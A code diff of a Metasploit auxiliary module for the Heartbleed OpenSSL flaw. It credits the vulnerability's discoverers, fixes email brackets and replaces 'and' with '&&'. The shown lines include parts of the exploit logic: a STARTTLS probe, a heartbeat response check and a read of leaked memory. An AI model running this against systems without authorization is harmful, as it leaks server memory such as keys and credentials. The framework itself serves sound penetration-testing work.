@@ -78,9 +78,13 @@ class Metasploit3 < Msf::Auxiliary
         memory data in the response.
       },
       'Author'      => [
-        'Jared Stafford <jspenguin[at]jspenguin.org', # Original Proof of Concept. This module is based on it.
+        'Neel Mehta', # Vulnerability discovery
+        'Riku', # Vulnerability discovery
+        'Antti', # Vulnerability discovery
+        'Matti', # Vulnerability discovery
+        'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.
         'FiloSottile', # PoC site and tool
-        'Christian Mehlmauer <FireFart[at]gmail.com', # Msf module
+        'Christian Mehlmauer <FireFart[at]gmail.com>', # Msf module
         'juan vazquez',  #Msf module
         'wvu' # Msf module
       ],
@@ -110,7 +114,7 @@ class Metasploit3 < Msf::Auxiliary
     sock.get_once
     sock.put("EHLO starttlstest\n")
     res = sock.get_once
-    unless res and res =~ /STARTTLS/
+    unless res && res =~ /STARTTLS/
       return nil
     end
     sock.put("STARTTLS\n")
@@ -151,7 +155,7 @@ class Metasploit3 < Msf::Auxiliary
     version = unpacked[1] # must match the type from client_hello
     len = unpacked[2]
 
-    unless type == HEARTBEAT_RECORD_TYPE and version == TLS_VERSION
+    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION
       print_error("#{peer} - Unexpected Heartbeat response'")
       disconnect
       return
@@ -159,7 +163,7 @@ class Metasploit3 < Msf::Auxiliary
 
     print_status("#{peer} - Heartbeat response, checking if there is data leaked...")
     heartbeat_data = sock.get_once(16384) # Read the magic length...
-    if heartbeat_data and heartbeat_data.length > len
+    if heartbeat_data && heartbeat_data.length > len
       print_status("#{peer} - Heartbeat response with leak...")
       report_vuln({
         :host => rhost,
